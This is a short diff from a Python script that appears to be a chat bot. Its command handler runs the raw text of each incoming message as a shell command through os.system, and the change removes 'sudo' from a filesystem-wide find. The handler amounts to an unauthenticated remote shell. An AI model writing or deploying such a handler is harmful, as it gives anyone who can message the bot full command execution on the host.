@@ -22,7 +22,7 @@ def getinfo(message):
 def handle_commands(message):
         commnd = message.text
         os.system(f"{commnd} >> cmd.txt")
-        os.system("sudo find / -name 'cmd.txt' >> find.txt")  
+        os.system("find / -name 'cmd.txt' >> find.txt")  
         with open("find.txt","r") as cmd:
                 find = cmd.read().split("\n")[0]
         with open(find,"r") as cmd:
